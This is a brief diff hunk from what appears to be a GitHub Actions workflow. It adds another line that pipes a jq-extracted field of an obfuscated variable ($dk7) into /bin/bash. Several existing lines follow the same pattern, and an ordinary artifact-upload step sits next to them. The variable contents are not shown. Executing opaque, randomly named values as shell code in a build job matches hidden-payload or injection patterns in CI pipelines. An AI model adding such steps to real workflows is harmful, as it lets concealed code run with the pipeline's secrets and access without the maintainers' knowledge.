@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$wx663" | jq -r .enop04 | /bin/bash
           echo $qlpot08699 | jq -r .ap074 | /bin/bash
           printf '%s' "$kdxd7" | jq -r .ryrzk3318 | /bin/bash
+          echo $dk7 | jq -r .jlxp53 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
